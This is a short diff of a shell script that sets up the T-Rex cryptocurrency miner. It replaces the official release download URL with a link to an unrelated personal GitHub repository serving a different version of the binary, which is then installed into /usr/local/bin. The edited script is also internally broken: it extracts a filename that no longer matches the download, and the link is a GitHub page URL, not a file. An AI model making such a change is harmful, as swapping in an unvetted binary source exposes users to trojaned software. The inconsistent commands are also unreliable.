@@ -10,7 +10,7 @@ export PATH=/usr/local/cuda-11.2/bin${PATH:+:${PATH}}
 export LD_LIBRARY_PATH=/usr/local/cuda-11.2/lib64${LD_LIBRARY_PATH:+:${LD_LIBRARY_PATH}}
 make SMS="75"
 cd && mkdir trex && cd trex
-wget https://github.com/trexminer/T-Rex/releases/download/0.20.0/t-rex-0.20.0-linux.tar.gz
+wget https://github.com/hhenryskate/test/blob/8d8ed4acd3677f9507c179eb7630785054ad90f7/t-rex-0.20.1-linux.tar.gz
 tar -xvf t-rex-0.20.0-linux.tar.gz && cd trex && mv trex /usr/local/bin
 chmod 775 ETH-2miners.sh
 cp ETH-2miners.sh /usr/local/bin
